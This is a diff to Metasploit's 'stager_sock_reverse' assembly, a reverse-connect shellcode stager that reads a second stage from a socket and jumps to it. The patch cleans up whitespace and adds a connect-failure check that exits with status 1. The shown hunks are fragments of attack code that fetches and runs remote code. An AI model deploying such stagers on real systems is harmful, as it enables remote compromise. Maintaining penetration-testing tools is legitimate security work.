@@ -1,9 +1,9 @@
 ;;
-; 
+;
 ;        Name: stager_sock_reverse
 ;   Qualities: Can Have Nulls
 ;     Version: $Revision: 1512 $
-;     License: 
+;     License:
 ;
 ;        This file is part of the Metasploit Exploit Framework
 ;        and is subject to the same licenses and copyrights as
@@ -62,6 +62,8 @@ connect:
 	mov  ecx, esp         ; socketcall args
 	inc  ebx              ; 3 = SYS_CONNECT
 	int  0x80
+	test eax, eax
+  js failed
 
 %ifndef USE_SINGLE_STAGE
 
@@ -84,5 +86,10 @@ recv:
 	mov  al, 0x3          ; __NR_read
 	int  0x80
 	jmp  ecx
+
+failed:
+	mov eax, 0x1
+	mov ebx, 0x1          ; set exit status to 1
+	int 0x80              ; sys_exit
 
 %endif
